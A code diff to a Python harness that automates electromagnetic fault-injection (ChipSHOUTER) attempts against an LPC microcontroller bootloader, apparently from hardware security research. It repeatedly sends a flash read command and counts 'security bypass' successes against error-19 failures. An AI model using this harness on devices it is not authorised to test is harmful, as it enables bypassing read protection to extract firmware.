@@ -224,14 +224,59 @@ def perform_glitch_test(ser, verbose=False):
             print(response)
 
     # Parse the response to determine glitch result
-    # Response "19" means glitch failed (normal operation)
+    # Response "19" means glitch failed (normal operation - error code)
     # Response "0" means glitch succeeded (security bypass)
-    # No response means glitch failed (target didn't respond properly)
+    # No response means glitch failed (target hung/crashed)
 
     if "19" in response:
-        return "FAILED"
+        return "FAILED_ERROR19"
     elif "No response data" in response or not response.strip():
-        return "FAILED"
+        return "FAILED_NO_RESPONSE"
+    elif "0" in response and "19" not in response:
+        return "SUCCESS"
+    else:
+        return "UNKNOWN"
+
+
+def perform_quick_glitch_test(ser, verbose=False):
+    """Perform a quick glitch test (sync target, arm, and send)."""
+    if verbose:
+        print("\nPerforming quick glitch test...")
+
+    # Sync with bootloader
+    ser.write(b"TARGET SYNC 115200 12000 10\r\n")
+
+    # Wait for sync completion
+    success, response = wait_for_response(ser, "LPC ISP sync complete", timeout=5.0, verbose=verbose)
+
+    if not success:
+        raise Exception("Failed to sync with LPC bootloader")
+
+    # Arm Pico trigger (ChipSHOUTER already armed and configured)
+    response = send_command(ser, "ARM ON", wait_time=0.2, verbose=verbose)
+    if "OK:" not in response and "armed" not in response.lower():
+        raise Exception(f"ARM ON command failed - response: {response}")
+
+    # Send read command to target (this will trigger the glitch)
+    if verbose:
+        print("Sending target command: R 0 516096")
+
+    ser.write(b'TARGET SEND "R 0 516096"\r\n')
+
+    # Wait for response
+    time.sleep(1.0)
+
+    response = ""
+    if ser.in_waiting > 0:
+        response = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
+        if verbose:
+            print(response)
+
+    # Parse the response to determine glitch result
+    if "19" in response:
+        return "FAILED_ERROR19"
+    elif "No response data" in response or not response.strip():
+        return "FAILED_NO_RESPONSE"
     elif "0" in response and "19" not in response:
         return "SUCCESS"
     else:
@@ -242,11 +287,14 @@ def run_glitch_test(num_iterations=1, verbose=True):
     """Run the complete glitch test sequence."""
 
     success_count = 0
-    fail_count = 0
+    fail_error19_count = 0
+    fail_no_response_count = 0
     unknown_count = 0
 
     print(f"ChipSHOUTER LPC Bootloader Glitch Test")
     print("=" * 60)
+
+    ser = None
 
     for iteration in range(num_iterations):
         if num_iterations > 1:
@@ -254,55 +302,79 @@ def run_glitch_test(num_iterations=1, verbose=True):
             print("-" * 60)
 
         try:
-            # Connect to Pico
-            ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=TIMEOUT)
-            time.sleep(0.5)
+            # First iteration: full setup
+            if iteration == 0:
+                # Connect to Pico
+                ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=TIMEOUT)
+                time.sleep(0.5)
 
-            # Reboot Pico for clean state
-            ser = reboot_pico(ser, verbose=verbose)
+                # Reboot Pico for clean state
+                ser = reboot_pico(ser, verbose=verbose)
 
-            # Setup LPC target and sync
-            setup_lpc_target(ser, verbose=verbose)
+                # Setup LPC target and sync
+                setup_lpc_target(ser, verbose=verbose)
 
-            # Configure glitch parameters
-            configure_glitch(ser, verbose=verbose)
+                # Configure glitch parameters
+                configure_glitch(ser, verbose=verbose)
 
-            # Perform glitch test
-            result = perform_glitch_test(ser, verbose=verbose)
+                # Perform glitch test
+                result = perform_glitch_test(ser, verbose=verbose)
+            else:
+                # Subsequent iterations: quick test (no setup needed)
+                result = perform_quick_glitch_test(ser, verbose=verbose)
 
             # Report result
             if result == "SUCCESS":
                 print("\n✓ GLITCH SUCCESS - Security bypass detected!")
                 success_count += 1
-            elif result == "FAILED":
-                print("\n✗ GLITCH FAILED - Normal operation or no response")
-                fail_count += 1
+            elif result == "FAILED_ERROR19":
+                print("\n✗ GLITCH FAILED - Normal operation (error 19)")
+                fail_error19_count += 1
+            elif result == "FAILED_NO_RESPONSE":
+                print("\n✗ GLITCH FAILED - No response from target")
+                fail_no_response_count += 1
             else:
                 print("\n? GLITCH UNKNOWN - Unexpected response")
                 unknown_count += 1
 
-            ser.close()
-
         except Exception as e:
             print(f"\n✗ ERROR: {e}")
-            fail_count += 1
+            fail_error19_count += 1  # Count exceptions as failures
             try:
-                ser.close()
+                if ser:
+                    ser.close()
+                    ser = None
             except:
                 pass
+            # For errors, we need to reconnect
+            if iteration < num_iterations - 1:
+                try:
+                    ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=TIMEOUT)
+                    time.sleep(0.5)
+                except:
+                    pass
 
         # Small delay between iterations
         if iteration < num_iterations - 1:
-            time.sleep(1.0)
+            time.sleep(0.5)
+
+    # Close serial connection
+    if ser:
+        try:
+            ser.close()
+        except:
+            pass
 
     # Print summary
     if num_iterations > 1:
+        total_failed = fail_error19_count + fail_no_response_count
         print("\n" + "=" * 60)
         print("Test Summary:")
-        print(f"  Glitch Success: {success_count}/{num_iterations}")
-        print(f"  Glitch Failed:  {fail_count}/{num_iterations}")
-        print(f"  Unknown:        {unknown_count}/{num_iterations}")
-        print(f"  Success Rate:   {(success_count / num_iterations) * 100:.1f}%")
+        print(f"  Glitch Success:      {success_count}/{num_iterations}")
+        print(f"  Failed (Error 19):   {fail_error19_count}/{num_iterations}")
+        print(f"  Failed (No Response):{fail_no_response_count}/{num_iterations}")
+        print(f"  Unknown:             {unknown_count}/{num_iterations}")
+        print(f"  Success Rate:        {(success_count / num_iterations) * 100:.1f}%")
 
 
 def main():
